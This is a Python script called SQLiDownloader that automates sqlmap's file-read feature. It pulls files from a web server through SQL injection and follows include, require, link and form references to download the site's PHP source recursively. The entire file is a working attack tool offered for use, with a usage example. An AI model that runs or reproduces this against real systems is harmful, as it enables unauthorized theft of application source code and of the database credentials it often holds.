#! /usr/bin/python

import commands
import os
import re
import sys

print("""
    SQLiDownloader v0.1 - Automatic file downloader tool via SQLi
""")

if len(sys.argv) < 4:
	print("""
    Incorrect parameters:

    ./sqlidownloader.py [SQLMAP URL and PARAMS] [output-folder] [web_document_root_path] [first_file_or_index_file]

    Example

    ./sqlidownloader.py "-u http://server/news.php?id=2 --dbms=mysql -p id" prueba "/var/www/sqliweb" "/var/www/sqliweb/news.php"
	""")
	sys.exit()

sqlmap_arg = sys.argv[1]
dirw = sys.argv[2]
droot = sys.argv[3]
files = sys.argv[4].split()

def download_file(f):

	sqlcmd = "sqlmap " + sqlmap_arg + " --file-read=" + f + " --batch"

 	status, ret = commands.getstatusoutput(sqlcmd)
	patron = re.compile("files saved to.*\n\[\*\] (.*) \(same.*")

	filed = patron.findall(ret)
	if len(filed) > 0:

		p, a = os.path.split(f)
		p += "/"
		if len(p.replace(droot,"")) > 0:
			dest = "output/" + dirw + "/" + p.replace(droot,"") + a
		else:
			dest = "output/" + dirw + "/" + a


		os.rename(filed[0],dest)
		print("[+] Downloading File " + f + "")
		return dest

#########################################################################################################

print("[*] Starting Download")

if os.path.isdir("output"):
	print ("[+] Directory /output created")
else:
	os.makedirs("output")
	print ("[+] Directory /output created")

if os.path.isdir("output/" + dirw):
	print ("[+] Directory /output/" + dirw + " created")
else:
	os.makedirs("output/" + dirw)
	print ("[+] Directory /output/" + dirw + " created")

while (files):
	nf = download_file(files.pop())
	if nf:
		try:
			fo = open(nf,"r")
			fc = fo.read()
			fo.close()
		except IOError:
			fc = ""
			print ("[*] Error: Cannot Open File: " + nf)

		patron = re.compile("a.*href=['\"](.*\.php?)[\?\"']|require.*['\"](.*?)[\"']|include.*['\"](.*?)[\"']|form.*action=['\"](.*?)[\"']|header\(\"[L,l]ocation:\s(.*?)[\"']")
		fs = patron.findall(fc)
		for j in fs:
			for i in j:
				if len(i) > 0:

					da = os.path.split(os.path.abspath(nf))[0]
					df = os.path.split(i)[0]
					dr = os.path.join(da, i)
					dn = droot + os.path.dirname(nf).replace("output/" + dirw,"") + "/" + i
					if not os.path.isfile(dr):
						files.append(dn)
						if len(df) > 0:
							try:
								os.makedirs(os.path.join(da, df))
							except OSError:
								pass
						print("[-] Adding " + dn + " To Queue")

print "[*] Mass download completed in /output/" + dirw
